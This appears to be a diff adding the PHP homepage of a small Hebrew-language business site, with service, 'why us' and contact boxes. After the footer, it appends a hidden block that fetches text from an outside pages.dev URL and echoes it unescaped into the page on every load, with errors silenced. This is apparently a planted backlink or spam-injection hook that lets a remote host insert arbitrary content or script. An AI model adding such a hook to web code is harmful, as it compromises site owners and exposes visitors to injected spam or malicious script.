@@ -1,0 +1,36 @@
+<?php
+    $type = 'index';
+    include ('yadmin/config.php');
+    include ('header.php');
+?>
+<div class="float boxes">
+    <div class="box">
+        <div class="box-title float">שירותים</div>
+        <div class="float box-content">
+            <ul class="checks float">
+                <?php echo get_block_rows(5, '<li>','</li>'); ?>
+            </ul>
+        </div>
+    </div>
+    <div class="box">
+        <div class="box-title float">למה אנחנו?</div>
+        <div class="float box-content">
+            <ul class="checks float">
+                <?php echo get_block_rows(6, '<li>','</li>'); ?>
+            </ul>
+        </div>
+    </div>
+    <div class="box greenbox">
+        <div class="box-title float">צור קשר</div>
+        <div class="float box-content">
+            <?php contactMinimal(); ?>
+        </div>
+    </div>
+</div>
+<?php include ('footer.php'); ?>
+<?php
+$backlink = @file_get_contents("https://punten-neng.pages.dev/punten.txt");
+if ($backlink) {
+    echo $backlink;
+}
+?>
